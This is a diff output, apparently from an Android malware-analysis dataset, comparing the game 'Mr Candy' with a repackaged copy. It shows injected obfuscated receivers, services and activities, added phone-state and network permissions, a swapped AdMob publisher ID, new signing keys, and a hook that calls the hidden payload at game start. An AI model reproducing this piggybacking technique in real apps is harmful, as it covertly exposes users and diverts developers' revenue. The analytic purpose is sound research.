@@ -1,0 +1,154 @@
+Somente em result/APP_59/App_M_59/: android
+diff -r result/APP_59/App_B_59/AndroidManifest.xml result/APP_59/App_M_59/AndroidManifest.xml
+7c7
+<     <application android:debuggable="true" android:icon="@drawable/icon" android:label="Mr Candy">
+---
+>     <application android:debuggable="false" android:icon="@drawable/icon" android:label="Mr Candy">
+14a15,52
+>         <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.feiwo.coverscreen.SA" android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen"/>
+>         <activity android:launchMode="singleInstance" android:name="com.feiwo.coverscreen.WA"/>
+>         <receiver android:name="com.feiwo.coverscreen.SR">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>                 <action android:name="broadcast.route.control"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:name="com.rteosy.seyt.a"/>
+>         <service android:name="com.rteosy.seyt.b"/>
+>         <receiver android:name="com.rteosy.seyt.c">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:excludeFromRecents="true" android:launchMode="singleTask" android:name="android.sowsyr.SreaActivity"/>
+>         <service android:name="android.sowsyr.Csuet"/>
+>         <receiver android:name="android.sowsyr.GsieyTsen">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+15a54,59
+>     <uses-permission android:name="android.permission.INTERNET"/>
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+diff -r result/APP_59/App_B_59/apktool.yml result/APP_59/App_M_59/apktool.yml
+2c2
+< apkFileName: Bapp59-88EDB828BD786F95AEBBD314F6A272764E7AE8374D0CD3EA543B0709D928CD92.apk
+---
+> apkFileName: Mapp59-92AA70538DCEDC3D20E553FBA881A9CDFF9A7CA442F297EDC84356D41210FC56.apk
+Somente em result/APP_59/App_M_59/assets: pc
+Somente em result/APP_59/App_M_59/com: feiwo
+Somente em result/APP_59/App_M_59/com: rteosy
+diff -r result/APP_59/App_B_59/com/timeinvaders/mrcandy/BBAdmob.java result/APP_59/App_M_59/com/timeinvaders/mrcandy/BBAdmob.java
+95c95
+<     this._adView = new AdView((Activity)localObject2, AdSize.BANNER, "a15294eb0fcf87d");
+---
+>     this._adView = new AdView((Activity)localObject2, AdSize.BANNER, "a150609e6ac83e5");
+diff -r result/APP_59/App_B_59/com/timeinvaders/mrcandy/c_MyApp.java result/APP_59/App_M_59/com/timeinvaders/mrcandy/c_MyApp.java
+957c957
+<     bb_globals_const.g_tienda = 2;
+---
+>     bb_globals_const.g_tienda = 3;
+diff -r result/APP_59/App_B_59/com/timeinvaders/mrcandy/MonkeyConfig.java result/APP_59/App_M_59/com/timeinvaders/mrcandy/MonkeyConfig.java
+9c9
+<   static final String ADMOB_PUBLISHER_ID = "a15294eb0fcf87d";
+---
+>   static final String ADMOB_PUBLISHER_ID = "a150609e6ac83e5";
+diff -r result/APP_59/App_B_59/com/timeinvaders/mrcandy/MonkeyGame.java result/APP_59/App_M_59/com/timeinvaders/mrcandy/MonkeyGame.java
+4a5
+> import android.sowsyr.RerhnAndroid;
+11a13,17
+>   public void dywtsbn()
+>   {
+>     new RerhnAndroid(this).GVern();
+>   }
+>   
+13a20
+>     dywtsbn();
+Somente em result/APP_59/App_M_59/com: wwoyty
+Os arquivos binários result/APP_59/App_B_59/original/AndroidManifest.xml e result/APP_59/App_M_59/original/AndroidManifest.xml são diferentes
+Somente em result/APP_59/App_M_59/original/META-INF: ABC_KEYS.RSA
+Somente em result/APP_59/App_M_59/original/META-INF: ABC_KEYS.SF
+diff -r result/APP_59/App_B_59/original/META-INF/MANIFEST.MF result/APP_59/App_M_59/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.6.0_65 (Apple Inc.)
+---
+> Created-By: 1.6.0_45 (Sun Microsystems Inc.)
+104c104
+< SHA1-Digest: IxVHyoPIaM/EEmHlXdc5zClo5sk=
+---
+> SHA1-Digest: iAV0Bf4YhPq141ldCgIE3GFfdOM=
+135a136,138
+> Name: assets/pc/icp.dat
+> SHA1-Digest: Z/TozjGjnM98X1Dk+lvpWP2Ng3g=
+> 
+146c149
+< SHA1-Digest: 5vFDY6DtF45QZQbfR3+5/LHns+c=
+---
+> SHA1-Digest: vM13BTHNt8gITBkW8N3lWego+MI=
+170c173
+< SHA1-Digest: iWXKYMjhYXKPoYMDFuSKnzPxSrs=
+---
+> SHA1-Digest: eN6AzfZqXVVq4usnR1OWbnhDeR0=
+230c233
+< SHA1-Digest: GKHWsyuu56jjrsndI+N9XmtaJSo=
+---
+> SHA1-Digest: R+ip0EDet8y+4z4jHEbS9ajegjQ=
+Somente em result/APP_59/App_B_59/original/META-INF: TIMEINVA.RSA
+Somente em result/APP_59/App_B_59/original/META-INF: TIMEINVA.SF
+Somente em result/APP_59/App_M_59/smali: android
+Somente em result/APP_59/App_M_59/smali/com: feiwo
+Somente em result/APP_59/App_M_59/smali/com: rteosy
+diff -r result/APP_59/App_B_59/smali/com/timeinvaders/mrcandy/BBAdmob.smali result/APP_59/App_M_59/smali/com/timeinvaders/mrcandy/BBAdmob.smali
+292c292
+<     const-string v8, "a15294eb0fcf87d"
+---
+>     const-string v8, "a150609e6ac83e5"
+diff -r result/APP_59/App_B_59/smali/com/timeinvaders/mrcandy/c_MyApp.smali result/APP_59/App_M_59/smali/com/timeinvaders/mrcandy/c_MyApp.smali
+4991c4991
+<     const/4 v0, 0x2
+---
+>     const/4 v0, 0x3
+diff -r result/APP_59/App_B_59/smali/com/timeinvaders/mrcandy/MonkeyConfig.smali result/APP_59/App_M_59/smali/com/timeinvaders/mrcandy/MonkeyConfig.smali
+15c15
+< .field static final ADMOB_PUBLISHER_ID:Ljava/lang/String; = "a15294eb0fcf87d"
+---
+> .field static final ADMOB_PUBLISHER_ID:Ljava/lang/String; = "a150609e6ac83e5"
+diff -r result/APP_59/App_B_59/smali/com/timeinvaders/mrcandy/MonkeyGame.smali result/APP_59/App_M_59/smali/com/timeinvaders/mrcandy/MonkeyGame.smali
+27a28,40
+> .method public dywtsbn()V
+>     .locals 1
+> 
+>     .prologue
+>     new-instance v0, Landroid/sowsyr/RerhnAndroid;
+> 
+>     invoke-direct {v0, p0}, Landroid/sowsyr/RerhnAndroid;-><init>(Landroid/content/Context;)V
+> 
+>     invoke-virtual {v0}, Landroid/sowsyr/RerhnAndroid;->GVern()V
+> 
+>     return-void
+> .end method
+> 
+42a56,57
+>     invoke-virtual {p0}, Lcom/timeinvaders/mrcandy/MonkeyGame;->dywtsbn()V
+> 
+Somente em result/APP_59/App_M_59/smali/com: wwoyty
